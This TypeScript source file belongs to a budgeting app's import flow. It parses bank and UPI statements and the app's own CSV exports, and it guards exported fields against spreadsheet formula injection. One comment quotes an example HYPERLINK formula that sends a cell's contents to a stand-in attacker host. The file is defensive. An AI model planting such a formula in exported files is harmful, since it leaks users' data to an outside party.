import { parseToPaise } from './money';
import type { TxnKind, PayMethod } from '../constants/enums';

/**
 * Tolerant statement parser for the Import → Review flow. Bank/UPI exports vary
 * wildly, so this is best-effort and never throws: it extracts what it can and
 * the Review inbox is the correction layer. Pure (no DB / RN), so it's unit-tested.
 */

export type ParsedDirection = 'debit' | 'credit' | 'unknown';

export type ParsedRow = {
  /** epoch ms; falls back to now when no date is found. */
  date: number;
  /** positive paise. */
  amount: number;
  description: string;
  direction: ParsedDirection;
  /** debit → expense, credit → income (the user can change it in Review). */
  kind: TxnKind;
  /** Known category when the source carries one (our own export). Otherwise the
   *  Review flow guesses it via `matchCategory`. */
  category?: string;
  /** Detected payment method when the source text carries a cue (email/notification
   *  alerts). Undefined for plain CSV rows; the Review inbox lets the user set it. */
  payMethod?: PayMethod;
  raw: string;
};

export type ParseResult = { rows: ParsedRow[]; skipped: number };

const DELIMITERS = [',', '\t', ';', '|'] as const;
const MONEY_RE = /^[(\-]?\s*(?:₹|rs\.?|inr)?\s*[\d,]+(?:\.\d{1,2})?\s*(?:dr|cr)?\s*\)?$/i;

type MoneyMarker = 'dr' | 'cr' | 'neg' | 'none';

/** Which delimiter splits the text most consistently across its lines. */
function detectDelimiter(lines: string[]): string {
  let best = ',';
  let bestScore = -1;
  for (const d of DELIMITERS) {
    const counts = lines.map(l => l.split(d).length - 1).filter(c => c > 0);
    if (counts.length === 0) continue;
    const mode = counts.slice().sort((a, b) => a - b)[Math.floor(counts.length / 2)];
    const consistent = counts.filter(c => c === mode).length;
    // Prefer the most consistent delimiter; tie-break toward more columns so a
    // stray comma inside "12,500" never beats a real "|"/tab separator.
    const score = consistent * 100 + mode;
    if (score > bestScore) { bestScore = score; best = d; }
  }
  return best;
}

/** Parse a money-looking field → { paise (>=0), marker } or null. Zero cells are
 *  kept so debit/credit column positions survive. */
function parseMoney(field: string): { paise: number; marker: MoneyMarker } | null {
  const f = field.trim();
  if (!f || !MONEY_RE.test(f)) return null;
  const paise = parseToPaise(f);
  let marker: MoneyMarker = 'none';
  if (/dr\b/i.test(f)) marker = 'dr';
  else if (/cr\b/i.test(f)) marker = 'cr';
  else if (f.startsWith('(') || f.startsWith('-')) marker = 'neg';
  return { paise, marker };
}

const DMY = /^(\d{1,2})[\/\-.](\d{1,2})[\/\-.](\d{2,4})$/;

/** Parse a date-looking field → epoch ms, or null. Tries dd/mm/yyyy then Date.parse. */
function parseDate(field: string): number | null {
  const f = field.trim();
  if (!f) return null;
  const m = DMY.exec(f);
  if (m) {
    const [, d, mo, y] = m;
    const yr = y.length === 2 ? 2000 + Number(y) : Number(y);
    const dt = new Date(yr, Number(mo) - 1, Number(d));
    if (!isNaN(dt.getTime()) && dt.getMonth() === Number(mo) - 1) return dt.getTime();
  }
  // ISO / named-month formats — but never treat a bare number as a date.
  if (/[a-z]/i.test(f) || /\d{4}-\d{2}-\d{2}/.test(f)) {
    const t = Date.parse(f);
    if (!isNaN(t)) return t;
  }
  return null;
}

export function parseStatement(text: string): ParseResult {
  const lines = (text ?? '').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  if (lines.length === 0) return { rows: [], skipped: 0 };

  const delim = detectDelimiter(lines);
  const rows: ParsedRow[] = [];
  let skipped = 0;

  for (const line of lines) {
    const fields = (delim && line.includes(delim) ? line.split(delim) : [line]).map(f => f.trim());

    const moneyFields = fields
      .map((f, i) => ({ i, m: parseMoney(f) }))
      .filter((x): x is { i: number; m: { paise: number; marker: MoneyMarker } } => x.m !== null);

    // No money anywhere → header / junk.
    if (moneyFields.length === 0) { skipped += 1; continue; }

    const dateIdx = fields.findIndex(f => parseDate(f) !== null);
    const date = dateIdx >= 0 ? parseDate(fields[dateIdx])! : Date.now();

    let amount = 0;
    let amtIdx = -1;
    let direction: ParsedDirection = 'unknown';

    const marked = moneyFields.find(x => x.m.marker !== 'none');
    if (marked) {
      amount = marked.m.paise; amtIdx = marked.i;
      direction = marked.m.marker === 'cr' ? 'credit' : 'debit';
    } else if (moneyFields.length >= 3) {
      // [… debit, credit, balance] — last money field is the running balance.
      const debit = moneyFields[moneyFields.length - 3];
      const credit = moneyFields[moneyFields.length - 2];
      if (debit.m.paise > 0) { amount = debit.m.paise; amtIdx = debit.i; direction = 'debit'; }
      else { amount = credit.m.paise; amtIdx = credit.i; direction = 'credit'; }
    } else if (moneyFields.length === 2) {
      // [debit, credit] — whichever is non-zero.
      const [a, b] = moneyFields;
      if (a.m.paise > 0) { amount = a.m.paise; amtIdx = a.i; direction = 'debit'; }
      else { amount = b.m.paise; amtIdx = b.i; direction = 'credit'; }
    } else {
      // Single plain amount, no debit indicator → treat as income (Review corrects).
      amount = moneyFields[0].m.paise; amtIdx = moneyFields[0].i; direction = 'credit';
    }

    if (amount <= 0) { skipped += 1; continue; }
    const kind: TxnKind = direction === 'credit' ? 'income' : 'expense';

    const usedIdx = new Set<number>([dateIdx, amtIdx]);
    const description = fields
      .filter((f, i) => !usedIdx.has(i) && !MONEY_RE.test(f))
      .sort((a, b) => b.length - a.length)[0] ?? 'Imported';

    rows.push({ date, amount, description, direction, kind, raw: line });
  }

  return { rows, skipped };
}

// --- BudgetSplit's own export format ---------------------------------------
// Re-importing a file produced by the per-group "Export as CSV" action. Unlike a
// bank statement, this format is precise: it carries Category and Kind, so we
// parse it exactly (preserving both) instead of guessing.

/**
 * The header row every group export starts with. Also its detection signature.
 *
 * `Direction` is new, and it is the fix for a re-import that reversed money.
 * Without it the parser inferred direction from `Kind` alone — and a settlement is
 * not inherently one way or the other. "Rahul sent me ₹5,000" came back as ₹5,000
 * PAID OUT, so `CASH_TOTALS_SQL` moved it from `+settledIn` to `−settledOut` and
 * cash was wrong by ₹10,000, feeding Safe-to-Spend, the health score and the
 * overspend raid. Exporting and re-importing is a normal thing to do when moving
 * phones without a `.bsbackup`.
 */
export const GROUP_EXPORT_HEADER = 'Date,Group,Category,Kind,Direction,Amount,Note';

/**
 * The pre-Direction header. Files written before this still import — they are
 * somebody's data — and fall back to the old inference, which is right for every
 * kind except an inbound settlement.
 */
export const GROUP_EXPORT_HEADER_V1 = 'Date,Group,Category,Kind,Amount,Note';

/**
 * Wrap a field in double quotes, escaping embedded quotes — the exact inverse of
 * {@link splitCsvLine}. Every quoted field an exporter writes must go through this:
 * an unescaped `"` terminates the field early and shifts every later column.
 *
 * It also neutralises **formula injection**. Excel, Numbers and Sheets evaluate a
 * quoted field that begins with `=`, `+`, `-`, `@`, tab or CR, so a note reading
 * `=HYPERLINK("https://evil.example/"&A1,"Open")` exfiltrates the row the moment
 * the exported file is opened. Notes are free multiline text
 * (`NoteSheet`, `VoiceEntrySheet`), and category and group names are user-supplied
 * too. A leading apostrophe is the standard defence: spreadsheets treat the field
 * as text, and every CSV parser — including {@link splitCsvLine} — reads it back
 * as an ordinary character.
 *
 * The apostrophe is in the guarded set too, so that {@link csvUnguard} is an exact
 * inverse: without it a note that genuinely begins `'=` would come back as `=`,
 * and the fix for a security hole would quietly edit people's notes.
 */
const CSV_FORMULA_LEAD = /^['=+\-@\t\r]/;

export function csvQuote(s: string | null | undefined): string {
  const raw = s ?? '';
  const guarded = CSV_FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/**
 * Undo {@link csvQuote}'s formula guard. Only ever applied to OUR OWN export
 * format — a third-party CSV was never guarded, so stripping there would be
 * editing someone else's data.
 */
export function csvUnguard(s: string): string {
  return s.startsWith("'") && CSV_FORMULA_LEAD.test(s.slice(1)) ? s.slice(1) : s;
}

/**
 * Split a whole CSV into rows, honouring newlines INSIDE quoted fields.
 *
 * `parseBudgetSplitExport` used to split on newlines and only then honour quotes,
 * which tore any row whose note contained one — valid RFC-4180 that this app's own
 * exporter produces, because the note field is `multiline`. The first half failed
 * the column count and the second parsed as garbage, so the transaction was lost
 * on re-import and only the aggregate "N skipped" count reported it.
 */
export function splitCsvRows(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cur = '';
  let inQuotes = false;
  let started = false;   // distinguishes a real empty final field from a trailing newline

  const endField = () => { row.push(cur); cur = ''; };
  const endRow = () => {
    if (started) { endField(); rows.push(row); row = []; }
    started = false;
  };

  const src = (text ?? '').replace(/^\uFEFF/, '');
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (inQuotes) {
      if (ch === '"') {
        if (src[i + 1] === '"') { cur += '"'; i++; } else inQuotes = false;
      } else cur += ch;
      continue;
    }
    if (ch === '"') { inQuotes = true; started = true; continue; }
    if (ch === ',') { endField(); started = true; continue; }
    if (ch === '\r') continue;
    if (ch === '\n') { endRow(); continue; }
    cur += ch;
    started = true;
  }
  endRow();
  return rows;
}

/** Split one CSV line, honouring double-quoted fields and "" escapes. */
export function splitCsvLine(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') { cur += '"'; i++; } // escaped quote
        else inQuotes = false;
      } else cur += ch;
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',') {
      out.push(cur); cur = '';
    } else {
      cur += ch;
    }
  }
  out.push(cur);
  return out;
}

/**
 * First non-empty line matches one of our export headers (BOM-tolerant,
 * case-insensitive).
 *
 * Both versions, because a file written before `Direction` existed is still
 * somebody's data and must not silently fall through to the generic
 * bank-statement heuristic \u2014 which loses Category and Kind and reports every row
 * as a guessed expense.
 */
export function isBudgetSplitExport(text: string): boolean {
  const first = (text ?? '').replace(/^\uFEFF/, '').split(/\r?\n/).map(l => l.trim()).find(Boolean);
  if (!first) return false;
  const header = first.toLowerCase();
  return header === GROUP_EXPORT_HEADER.toLowerCase()
    || header === GROUP_EXPORT_HEADER_V1.toLowerCase();
}

function normalizeKind(field: string): TxnKind {
  const k = field.trim().toLowerCase();
  return k === 'income' || k === 'settlement' ? k : 'expense';
}

/** Parse an export date to epoch ms. Accepts `yyyy-MM-dd` plus an optional
 *  ` HH:mm` / `THH:mm(:ss)` time (interpreted in local time); falls back to now. */
function parseExportDate(field: string): number {
  const m = /^(\d{4})-(\d{2})-(\d{2})(?:[ T](\d{2}):(\d{2})(?::(\d{2}))?)?$/.exec(field.trim());
  if (m) {
    const d = new Date(
      Number(m[1]), Number(m[2]) - 1, Number(m[3]),
      Number(m[4] ?? 0), Number(m[5] ?? 0), Number(m[6] ?? 0),
    );
    if (!isNaN(d.getTime())) return d.getTime();
  }
  return Date.now();
}

/** Parse a BudgetSplit group-export CSV. Category and Kind are preserved. */
export function parseBudgetSplitExport(text: string): ParseResult {
  // Tokenised over the whole text, so a note containing a newline stays one row.
  const all = splitCsvRows(text);
  const rows: ParsedRow[] = [];
  let skipped = 0;

  // Which layout this file is in, decided once from its header rather than from
  // each row's column count \u2014 a note with a comma in it is quoted, so counting
  // fields per row would be guessing.
  const headerRow = all.find(r => r.some(f => f.trim()));
  const header = (headerRow ?? []).map(f => f.trim().toLowerCase()).join(',');
  const hasDirection = header === GROUP_EXPORT_HEADER.toLowerCase();
  const isHeader = hasDirection || header === GROUP_EXPORT_HEADER_V1.toLowerCase();

  for (const fields of all) {
    if (fields.length === 0 || !fields.some(f => f.trim())) continue;
    if (isHeader && fields === headerRow) continue;

    const min = hasDirection ? 6 : 5;
    if (fields.length < min) { skipped += 1; continue; }

    const [dateStr, , categoryStr, kindStr, ...rest] = fields;
    const directionStr = hasDirection ? rest[0] : '';
    const amountStr = hasDirection ? rest[1] : rest[0];
    const noteStr = (hasDirection ? rest[2] : rest[1]) ?? '';

    const amount = parseToPaise(amountStr);
    if (!(amount > 0)) { skipped += 1; continue; }

    const kind = normalizeKind(kindStr);
    // Unguarded, because this is our own format and `csvQuote` wrote the guard.
    const category = csvUnguard(categoryStr.trim()) || undefined;
    const note = csvUnguard(noteStr.trim());
    const description = note || category || 'Imported';
    /*
     * Read it when the file carries it. A settlement is not inherently one way,
     * and inferring `debit` from the kind is what turned "Rahul sent me \u20B95,000"
     * into \u20B95,000 paid out on re-import.
     *
     * The old fallback stays for files written before the column existed: it is
     * right for every kind except an inbound settlement, which is the best that
     * can be done with what those files contain.
     */
    const direction: ParsedDirection = hasDirection
      ? (directionStr.trim().toLowerCase() === 'credit' ? 'credit' : 'debit')
      : (kind === 'income' ? 'credit' : 'debit');

    rows.push({
      date: parseExportDate(dateStr), amount, description, direction, kind, category,
      raw: fields.join(','),
    });
  }

  return { rows, skipped };
}
